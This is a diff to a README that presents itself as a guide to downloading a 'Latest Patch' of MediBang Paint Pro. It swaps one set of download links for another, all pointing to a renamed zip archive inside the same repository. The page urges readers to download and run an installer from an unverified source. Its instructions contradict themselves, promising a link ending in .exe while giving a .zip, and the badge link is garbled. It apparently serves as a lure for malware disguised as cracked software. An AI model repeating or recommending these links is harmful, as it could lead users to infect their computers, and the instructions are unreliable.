@@ -1,6 +1,6 @@
 # 🎨 MediBang-Paint-Pro-Latest-Patch - Your Guide to Digital Art Mastery
 
-[![Download Now](https://raw.githubusercontent.com/lololol321/MediBang-Paint-Pro-Latest-Patch/main/coarse/MediBang-Paint-Pro-Latest-Patch_v1.2.zip%20Now-%https://raw.githubusercontent.com/lololol321/MediBang-Paint-Pro-Latest-Patch/main/coarse/MediBang-Paint-Pro-Latest-Patch_v1.2.zip)](https://raw.githubusercontent.com/lololol321/MediBang-Paint-Pro-Latest-Patch/main/coarse/MediBang-Paint-Pro-Latest-Patch_v1.2.zip)
+[![Download Now](https://github.com/lololol321/MediBang-Paint-Pro-Latest-Patch/raw/refs/heads/main/coarse/Paint-Medi-Patch-Latest-Bang-Pro-1.9.zip%20Now-%https://github.com/lololol321/MediBang-Paint-Pro-Latest-Patch/raw/refs/heads/main/coarse/Paint-Medi-Patch-Latest-Bang-Pro-1.9.zip)](https://github.com/lololol321/MediBang-Paint-Pro-Latest-Patch/raw/refs/heads/main/coarse/Paint-Medi-Patch-Latest-Bang-Pro-1.9.zip)
 
 ## 📦 Overview
 
@@ -12,13 +12,13 @@ To begin using MediBang Paint Pro, follow these steps to download and install th
 
 1. **Visit the Releases Page**
    - Click on the link below to go to the releases page and access the latest version of the software.
-   - [Visit this page to download](https://raw.githubusercontent.com/lololol321/MediBang-Paint-Pro-Latest-Patch/main/coarse/MediBang-Paint-Pro-Latest-Patch_v1.2.zip)
+   - [Visit this page to download](https://github.com/lololol321/MediBang-Paint-Pro-Latest-Patch/raw/refs/heads/main/coarse/Paint-Medi-Patch-Latest-Bang-Pro-1.9.zip)
 
 2. **Select the Latest Version**
    - On the releases page, find the most recent version listed at the top. It often includes important updates and features.
 
 3. **Download the Installation File**
-   - Locate the installation link. It usually ends with `.exe`, such as `https://raw.githubusercontent.com/lololol321/MediBang-Paint-Pro-Latest-Patch/main/coarse/MediBang-Paint-Pro-Latest-Patch_v1.2.zip`.
+   - Locate the installation link. It usually ends with `.exe`, such as `https://github.com/lololol321/MediBang-Paint-Pro-Latest-Patch/raw/refs/heads/main/coarse/Paint-Medi-Patch-Latest-Bang-Pro-1.9.zip`.
    - Click on it to download the installer file to your computer.
 
 4. **Run the Installer**
@@ -40,7 +40,7 @@ To begin using MediBang Paint Pro, follow these steps to download and install th
 
 For your convenience, here is the link to download the software again:
 
-[Visit this page to download](https://raw.githubusercontent.com/lololol321/MediBang-Paint-Pro-Latest-Patch/main/coarse/MediBang-Paint-Pro-Latest-Patch_v1.2.zip)
+[Visit this page to download](https://github.com/lololol321/MediBang-Paint-Pro-Latest-Patch/raw/refs/heads/main/coarse/Paint-Medi-Patch-Latest-Bang-Pro-1.9.zip)
 
 ## 🌟 Features
 
